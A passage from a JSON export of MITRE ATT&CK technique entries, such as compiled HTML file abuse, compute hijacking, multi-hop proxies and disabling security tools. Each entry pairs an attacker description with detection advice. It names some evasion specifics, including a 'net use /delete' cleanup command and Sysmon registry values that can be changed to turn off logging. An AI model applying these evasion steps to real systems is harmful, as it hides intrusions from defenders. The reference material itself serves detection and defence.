      "permissions_required": [],
      "data_sources": [
        "Firmware: Firmware Modification"
      ],
      "defense_bypassed": [],
      "detection": "There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation."
    },
    "T1218.001": {
      "id": "T1218.001",
      "name": "Compiled HTML File",
      "description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.001",
      "stix_id": "attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d",
      "created": "2020-01-23T18:53:54.377000+00:00",
      "modified": "2025-04-15T19:58:56.001000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.\n\nMonitor presence and use of CHM files, especially if they are not typically used within an environment."
    },
    "T1496.001": {
      "id": "T1496.001",
      "name": "Compute Hijacking",
      "description": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1496.001",
      "stix_id": "attack-pattern--a718a0c8-5768-41a1-9958-a1cc3f995e99",
      "created": "2024-09-25T13:34:30.100000+00:00",
      "modified": "2025-04-15T22:08:46.014000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "Sensor Health: Host Status",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1070.005": {
      "id": "T1070.005",
      "name": "Network Share Connection Removal",
      "description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.005",
      "stix_id": "attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c",
      "created": "2020-01-31T12:39:18.816000+00:00",
      "modified": "2025-04-16T20:37:18.727000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Command: Command Execution",
        "Process: Process Creation",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity."
    },
    "T1090.003": {
      "id": "T1090.003",
      "name": "Multi-hop Proxy",
      "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks \u2013 such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing) Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.(Citation: ORB Mandiant) \n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  \n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1090.003",
      "stix_id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d",
      "created": "2020-03-14T23:23:41.770000+00:00",
      "modified": "2025-04-15T19:58:56.270000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.\n\nIn context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP."
    },
    "T1110": {
      "id": "T1110",
      "name": "Brute Force",
      "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1110",
      "stix_id": "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd",
      "created": "2017-05-31T21:31:22.767000+00:00",
      "modified": "2025-04-15T19:58:56.556000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Command: Command Execution",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network."
    },
    "T1059.004": {
      "id": "T1059.004",
      "name": "Unix Shell",
      "description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.\n\nSome systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.004",
      "stix_id": "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56",
      "created": "2020-03-09T14:15:05.330000+00:00",
      "modified": "2025-04-15T19:58:56.647000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. "
    },
    "T1137.003": {
      "id": "T1137.003",
      "name": "Outlook Forms",
      "description": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\nOnce malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1137.003",
      "stix_id": "attack-pattern--a9e2cea0-c805-4bf8-9e31-f5f0513a3634",
      "created": "2019-11-07T20:06:02.624000+00:00",
      "modified": "2025-04-15T22:55:18.800000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior."
    },
    "T1219.003": {
      "id": "T1219.003",
      "name": "Remote Access Hardware",
      "description": "An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment.  \n\nRemote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors to bypass software security solutions and gain more control over the compromised device(s).(Citation: Palo Alto Unit 42 North Korean IT Workers 2024)(Citation: Google Cloud Threat Intelligence DPRK IT Workers 2024)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1219.003",
      "stix_id": "attack-pattern--a9fb6b3f-4a3c-4703-a4f1-f55f83d1e017",
      "created": "2025-03-26T15:36:18.409000+00:00",
      "modified": "2025-05-02T19:13:42.314000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Drive: Drive Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1562.001": {
      "id": "T1562.001",
      "name": "Disable or Modify Tools",
      "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool\u2019s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.001",
      "stix_id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
      "created": "2020-02-21T20:32:20.810000+00:00",
      "modified": "2025-04-15T19:58:57.147000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "Containers",
        "IaaS",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Sensor Health: Host Status",
        "Process: Process Termination",
        "Process: Process Creation",
        "Service: Service Metadata",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Deletion",
        "Driver: Driver Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.\n\nLack of expected log events may be suspicious."
    },
    "T1565": {
      "id": "T1565",
      "name": "Data Manipulation",
      "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1565",
      "stix_id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
      "created": "2020-03-02T14:19:22.609000+00:00",
      "modified": "2025-04-15T22:14:59.144000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Network Traffic: Network Traffic Content",
        "File: File Creation",
        "Network Traffic: Network Traffic Flow",
        "File: File Deletion",
        "File: File Modification",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data."
    },
    "T1559": {
      "id": "T1559",
      "name": "Inter-Process Communication",
      "description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1559",
      "stix_id": "attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d",
      "created": "2020-02-12T14:08:48.689000+00:00",
      "modified": "2025-04-15T19:58:57.325000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Process: Process Creation",
        "Script: Script Execution",
        "Process: Process Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms."
    },
    "T1001": {
      "id": "T1001",
      "name": "Data Obfuscation",
      "description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1001",
      "stix_id": "attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842",
      "created": "2017-05-31T21:30:18.931000+00:00",
      "modified": "2025-04-15T19:58:57.412000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
    },
    "T1039": {
      "id": "T1039",
      "name": "Data from Network Shared Drive",
      "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1039",
      "stix_id": "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c",
      "created": "2017-05-31T21:30:41.022000+00:00",
      "modified": "2025-04-16T20:37:18.881000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Share: Network Share Access",
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1584.006": {
      "id": "T1584.006",
      "name": "Web Services",
      "description": "Adversaries may compromise access to third-party web services\u00a0that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.006",
      "stix_id": "attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2",
      "created": "2020-10-01T01:01:00.176000+00:00",
      "modified": "2025-04-15T23:20:42.131000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Once adversaries leverage the abused web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567)."
    },
    "T1601": {
      "id": "T1601",
      "name": "Modify System Image",
      "description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1601",
      "stix_id": "attack-pattern--ae7f3575-0a5e-427e-991b-fe03ad44c754",
      "created": "2020-10-19T19:42:19.740000+00:00",
      "modified": "2025-04-25T15:15:59.227000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Most embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because this method may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. \n\nCompare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.  (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)\n\nMany vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)"
    },
    "T1574": {
      "id": "T1574",
      "name": "Hijack Execution Flow",
      "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574",
      "stix_id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
      "created": "2020-03-12T20:38:12.465000+00:00",
      "modified": "2025-04-15T19:58:57.767000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "File: File Creation",
        "Module: Module Load",
        "Process: Process Creation",
        "Service: Service Metadata",
        "File: File Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data."
    },
    "T1059.011": {
      "id": "T1059.011",
      "name": "Lua",
      "description": "Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (<code>.lua</code>), or from Lua-embedded programs (through the <code>struct lua_State</code>).(Citation: Lua main page)(Citation: Lua state)\n\nLua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.011",
      "stix_id": "attack-pattern--afddee82-3385-4682-ad90-eeced33f2d07",
      "created": "2024-08-05T18:19:42.201000+00:00",
      "modified": "2025-04-15T19:58:57.854000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
